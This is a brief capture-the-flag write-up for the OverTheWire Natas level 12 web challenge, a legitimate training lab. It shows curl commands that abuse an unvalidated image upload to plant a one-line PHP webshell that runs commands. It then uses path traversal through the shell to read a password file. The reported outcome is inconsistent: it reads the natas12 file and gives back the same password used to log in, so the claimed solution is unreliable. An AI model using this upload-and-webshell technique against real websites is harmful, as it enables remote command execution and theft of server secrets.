# natas level12
natas is CTF with web application.
password will be written `/etc/natas_webpass/natas12`.

## using credential is below.
- User:natas12
- Pass:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

## using tools.
- shell(curl, base64, etc)
- lynx
check web site by lynx.
`lynx http://natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3@natas12.natas.labs.overthewire.org`

This page has image upload function.
And I check upload function in source code, it don't validate file is image or not.

I try to upload text file, and it is successfully. 
`curl -X POST http://natas12.natas.labs.overthewire.org/index.php -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F submit=1 -F filename=ws.txt -F MAX_FILE_SIZE=1000 -F "uploadedfile=@./test.txt;type=image/jpg"`

~~~
The file <a href="upload/gwbho3moo1.txt">upload/gwbho3moo1.txt</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
~~~

if we access this url, we can see content of this file.

curl http://natas12.natas.labs.overthewire.org/upload/gwbho3moo1.txt -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 --verbose

I upload webshell by this upload function.
~~~
<?php echo passthru($_GET['cmd']); ?>
~~~

I can upload file and uri is `upload/d1h0n2raxm.php`.

And I can send command by this webshell. if we do following command, we can see current directory.
`curl http://natas12.natas.labs.overthewire.org/upload/d1h0n2raxm.php?cmd=pwd -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 --verbose`

And I got password with following command.
`curl 'http://natas12.natas.labs.overthewire.org/upload/d1h0n2raxm.php?cmd=cat+../../../../../etc/natas_webpass/natas12' -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 --verbose`

password is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

